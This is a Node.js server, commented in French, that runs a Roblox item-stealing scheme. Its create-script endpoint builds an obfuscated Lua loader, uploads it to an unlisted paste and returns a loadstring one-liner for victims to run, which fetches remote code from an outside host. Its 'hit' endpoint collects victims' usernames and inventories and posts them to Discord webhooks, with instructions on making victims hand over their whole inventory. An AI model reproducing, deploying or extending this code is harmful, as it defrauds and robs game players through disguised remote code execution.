const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');
const luamin = require('luamin');
const { randomBytes } = require('node:crypto'); // Utilise le préfixe node: pour être sûr
const { v4: uuidv4 } = require('uuid');
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, MessageFlags, WebhookClient } = require('discord.js');
const app = express();
app.use(express.json());
const server = http.createServer(app);
const axios = require('axios');
const { PastefyClient } = require('@interaapps/pastefy');

const BaseInfo = require('./models/BaseInfo'); // <-- import du modèle
const ScriptsInfos = require('./models/Scripts'); // <-- import du modèle
const UsersInfo = require('./models/Users'); // <-- import du modèle

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const WEBHOOK_URL = process.env.WEBHOOK_URL;
const PASTEFY_KEY = process.env.PASTEFY_KEY;

const pastefy = new PastefyClient(PASTEFY_KEY);
const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);


async function uploadScript(script, scriptTitle, folder) {
    try {
        // Correction ici : on utilise .pastes.create()
        const paste = await pastefy.createPaste({
            title: scriptTitle,
            content: script,
            folder: folder,
            visibility: 'UNLISTED',
            type: 'PASTE'
        });

        log(`✅ Succès ! Fichier uploadé.`);
        log(`🔗 URL: ${paste.raw_url}`);
        return paste;
    } catch (error) {
        log('❌ Erreur lors de l\'upload :', error);
    }
    return null;
}
async function obfuscateScript(luaCode) {
    try {
        log("🔍 [OBF] Step 1: Creating Session...");

        // ÉTAPE 1 : Créer la session avec le code source
        const sessionResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/newscript', 
            luaCode, // Le code est envoyé directement comme texte
            {
                headers: {
                    'apikey': process.env.LUA_OBF_KEY,
                    'content-type': 'text/plain' // La doc dit 'text'
                }
            }
        );

        const sessionId = sessionResponse.data.sessionId;
        if (!sessionId) throw new Error("No Session ID returned");

        log(`🔍 [OBF] Step 2: Applying Obfuscation (Session: ${sessionId.substring(0, 8)}...)`);

        // ÉTAPE 2 : Appliquer les plugins d'obfuscation
        const obfResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/obfuscate', 
            {
                "MinifiyAll": true,   // Dans le noeud racine
                "Virtualize": true,   // Dans le noeud racine
                "CustomPlugins": {
                    // Recommandé avant la virtualisation pour éviter les erreurs
                    "RewriteToLua51": true, 
                    "EncryptStrings": [100],
                    "ControlFlowFlattenV1AllBlocks": [100],
                    "SwizzleLookups": [100],
                    "MutateAllLiterals": [100] // Très bien car sans impact sur les perfs
                }
            }, 
            {
                headers: {
                    'apikey': process.env.LUA_OBF_KEY,
                    'sessionId': sessionId,
                    'content-type': 'application/json'
                }
            }
        );

        if (obfResponse.data && obfResponse.data.code) {
            log(`✅ [OBF] Success! Final code received.`);
            return obfResponse.data.code;
        }

        return null;

    } catch (error) {
        log(`❌ [OBF ERROR] ${error.response?.data?.message || error.message}`);
        return null;
    }
}

function generateScriptId() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let id = '';
    for (let i = 0; i < 8; i++) id += chars.charAt(Math.floor(Math.random() * chars.length));
    return id;
}

// --- CONNEXION DB ---
mongoose.connect(MONGO_URI)
    .then(() => {
        log("✅ [DB] Connexion établie");
    })
    .catch(err => log(`❌ [DB] ERREUR : ${err}`));


// --- BOT DISCORD ---
const clientDiscord = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

clientDiscord.once(Events.ClientReady, async () => {
    log(`🤖 Bot Discord connecté : ${clientDiscord.user.tag}`);
});

if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);

app.get('/api/admin/verify', (req, res) => {
    res.json({ success: req.query.token === ADMIN_TOKEN });
});

app.post('/api/create-script', async (req, res) => {
    try {
        // Auth check if ADMIN_TOKEN is set
        if (ADMIN_TOKEN) {
            const tokenQuery = req.query.token;
            const tokenHeader = req.headers['x-admin-token'];
            if (tokenQuery !== ADMIN_TOKEN && tokenHeader !== ADMIN_TOKEN) {
                return res.status(403).json({ success: false, message: 'Forbidden' });
            }
        }

        const body = req.body || {};
        const minIncome = Number(body.minIncome) || 10000000;
        const maxItems = Number(body.maxItems) || 10;
        const targetsRaw = body.targets || ["MagixSafe", "M4GIX_TAB01", "M4GIX_TAB02", "TeCu71710"];
        const webhookUrlRaw = body.webhookurl || '';
        const visualRaw = body.visual || '';

        // normalize targets to array of strings
        let targetsArray = [];
        if (Array.isArray(targetsRaw)) targetsArray = targetsRaw.map(t => String(t));
        else if (typeof targetsRaw === 'string') {
            targetsArray = targetsRaw.split(',').map(s => s.trim()).filter(s => s.length > 0);
        }

        const luaTargets = targetsArray.length > 0 ? targetsArray.map(t => `"${t.replace(/"/g, '\\"')}"`).join(', ') : '';
        const scriptId = generateScriptId();

        // build Lua loader script
        const lua = [
            `local fenv = getfenv()`,
            `local var0 = setmetatable({}, {`,
            `\t["__index"] = {},`,
            `})`,
            ``,
            `fenv["MinIncome"] = ${minIncome}`,
            `fenv["MaxItems"] = ${maxItems}`,
            `fenv["Targets"] = { ${luaTargets} }`,
            `fenv["Visual"] = ${visualRaw === "" ? '""' : '"' + String(visualRaw).replace(/"/g, '\\"') + '"'}`,
            `fenv["ScriptId"] = "${scriptId}"`,
            ``,
            `local var1 = game:HttpGet("https://m4gix-ws.onrender.com/TS")`,
            `local var2 = loadstring(var1)`,
            `local var3 = var2()`
        ].join('\n');

        const paste = await uploadScript(lua, `${scriptId}.lua`, 'hfI1y3F8');
        
        // Ne pas enregistrer en base pour l'instant — juste retourner le script
        return res.status(201).json({ success: true, data: { Script: `loadstring(game:HttpGet("${paste.raw_url}"))()` } });
    } catch (err) {
        log(`❌ [API] POST /api/create-script error: ${err && err.message ? err.message : err}`);
        return res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Route pour recevoir et persister les données envoyées par le script Lua
app.post('/api/base-infos', async (req, res) => {
    try {
        const payload = req.body || {};
        if (!payload.Name) {
            return res.status(400).json({ success: false, message: 'Missing Name field' });
        }

        // Sanitize / normalise Brainrots
        const brainrots = Array.isArray(payload.Brainrots) ? payload.Brainrots.map(br => ({
            Name: br && br.Name ? String(br.Name) : '',
            IncomeStr: br && br.IncomeStr ? String(br.IncomeStr) : '$0/s',
            Income: br && typeof br.Income !== 'undefined' ? Number(br.Income) || 0 : 0,
            Rarity: br && br.Rarity ? String(br.Rarity) : 'Common',
            Mutation: br && br.Mutation ? String(br.Mutation) : 'Default',
            Traits: Array.isArray(br && br.Traits) ? br.Traits : (br && typeof br.Traits === 'string' ? br.Traits.split(',').map(t => t.trim()) : [])
        })) : [];

        const update = {
            TotalPlace: Number(payload.TotalPlace) || 0,
            Brainrots: brainrots
        };

        const doc = await BaseInfo.findOneAndUpdate(
            { Name: String(payload.Name) },
            { $set: update },
            { upsert: true, new: true, setDefaultsOnInsert: true }
        );

        log(`✅ [API] BaseInfo saved for ${payload.Name}`);
        return res.json({ success: true, data: doc });
    } catch (err) {
        log(`❌ [API] /api/base-infos error: ${err}`);
        return res.status(500).json({ success: false, message: 'Internal server error' });
    }
});
// --- NOUVEL ENDPOINT: récupérer tous les Brainrots aplatis ---
app.get('/api/base-infos', async (req, res) => {
    try {
        const docs = await BaseInfo.find({}).lean();
        const items = [];
        for (const bi of docs) {
            const baseName = bi.Name || '';
            const totalPlace = bi.TotalPlace || 0;
            const brainrots = Array.isArray(bi.Brainrots) ? bi.Brainrots : [];
            for (const br of brainrots) {
                items.push({
                    BaseName: baseName,
                    TotalPlace: totalPlace,
                    Name: br && br.Name ? br.Name : '',
                    IncomeStr: br && br.IncomeStr ? br.IncomeStr : '$0/s',
                    Income: br && typeof br.Income !== 'undefined' ? Number(br.Income) || 0 : 0,
                    Rarity: br && br.Rarity ? br.Rarity : 'Common',
                    Mutation: br && br.Mutation ? br.Mutation : 'Default',
                    Traits: Array.isArray(br && br.Traits) ? br.Traits : []
                });
            }
        }
        return res.json({ success: true, data: items });
    } catch (err) {
        log(`❌ [API] GET /api/base-infos error: ${err}`);
        return res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

app.post('/api/hit', async (req, res) => {
    // IMPORTANT: toujours retourner 201 pour le client Lua, même en cas d'erreur.
    try {
        const payload = req.body || {};

        // Validation minimale attendue par ton script Lua
        if (!payload.Name) {
            log('⚠️ /api/hit reçu sans Name');
            // retourner 201 quand même pour la compatibilité Lua
            return res.status(201).json({ Success: true, Message: 'Hit received' });
        }

        // On forwarde d'abord vers WEBHOOK_URL si configuré
        const hitInfo = payload; // forwarder uniquement le payload tel quel
        log(`📣 [HIT] Reçu: ${hitInfo.Name || 'N/A'} ScriptId:${hitInfo.ScriptId || 'N/A'}`);

        if (WEBHOOK_URL) {
            PostHitOnWebHook(WEBHOOK_URL, hitInfo)
                .catch(err => log(`⚠️ PostHitOnWebHook (env) rejection: ${err && err.message ? err.message : err}`));
        } else {
            log('⚠️ WEBHOOK_URL non configuré, skip forward to env webhook');
        }

        // Si ScriptId présent et valide (non null, non vide), rechercher script et forwarder aussi
        try {
            if (hitInfo.ScriptId && String(hitInfo.ScriptId).trim() !== '') {
                const script = await ScriptsInfos.findOne({ Id: String(hitInfo.ScriptId) }).lean();
                if (script && script.WebHookUrl) {
                    // éviter double envoi vers la même URL
                    if (String(script.WebHookUrl) !== String(WEBHOOK_URL)) {
                        PostHitOnWebHook(script.WebHookUrl, hitInfo)
                            .catch(err => log(`⚠️ PostHitOnWebHook (script) rejection: ${err && err.message ? err.message : err}`));
                    } else {
                        log('ℹ️ Script WebHookUrl identique à WEBHOOK_URL, envoi unique effectué.');
                    }
                } else {
                    log(`⚠️ Aucun WebHookUrl trouvé pour ScriptId ${hitInfo.ScriptId}`);
                }
            }
        } catch (err) {
            log(`⚠️ Erreur lookup Script: ${err && err.message ? err.message : err}`);
            // on continue — la réponse au client Lua restera 201
        }

        // Retourner toujours 201 pour que le script Lua considère l'envoi comme réussi
        return res.status(201).json({ Success: true, Message: 'Hit received' });
    } catch (err) {
        // En cas d'exception interne, journaliser mais retourner success quand même
        log(`❌ [API] POST /api/hit error (catch): ${err && err.message ? err.message : err}`);
        return res.status(201).json({ Success: true, Message: 'Hit received (processing error logged)' });
    }
});

async function PostHitOnWebHook(webHookUrl, hitInfo) {
    try {
        const webhookClient = new WebhookClient({ url: webHookUrl });
        const hitEmbed = new EmbedBuilder()
                .setTitle("Rusteez Hit")
                .setColor(0x2b2d31)
                .setDescription(`🛠️ **How to proceed?**\nJoin SAB. The victim is set to send a trade request automatically. If they don't, manually send them one; they will accept and transfer their entire inventory to you.`)
                .addFields(
                    {
                        name: "📄 Player Information",
                        value: `\`\`\`properties\n🆔 Username     : ${hitInfo.Name}\n👑 Receiver     : ${Array.isArray(hitInfo.Targets) ? hitInfo.Targets.join(', ') : hitInfo.Targets}\n\`\`\``
                    },
                    {
                        name: "🧠 Brainrots",
                        value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0
                            ? hitInfo.Brainrots.sort((a, b) => (b.Income || 0) - (a.Income || 0)).map(br => {
                                // 1. Préparation des éléments (Mutation + Traits)
                                let extras = [];

                                // On ajoute la mutation en premier si elle existe
                                if (br.Mutation && br.Mutation !== "" && br.Mutation !== "None" && br.Mutation !== "Default") {
                                    extras.push(br.Mutation);
                                }

                                // On ajoute les traits (qu'ils soient déjà une string ou un array)
                                if (br.Traits) {
                                    if (Array.isArray(br.Traits)) {
                                        br.Traits.forEach(t => { if (t && t !== "") extras.push(t); });
                                    } else if (typeof br.Traits === 'string' && br.Traits !== "" && br.Traits !== "None") {
                                        extras.push(br.Traits);
                                    }
                                }

                                // 2. Formatage : [Diamond, Nyan, Taco] ou rien du tout
                                const extrasStr = extras.length > 0 ? `[${extras.join(', ')}] ` : "";

                                // 3. Retour de la ligne formatée
                                return `${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
                            }).join('\n')
                            : "None"}\n\`\`\``
                    }
                )
                .setFooter({ text: `Rusteez Script` })
                .setTimestamp();
        await webhookClient.send({
                content: hitInfo.Name,
                embeds: [hitEmbed]
            });
    } catch (err) {
        log(`⚠️ Forward Webhook Error: ${err.message}`);
    }
}

app.use(express.static('public'));

server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));
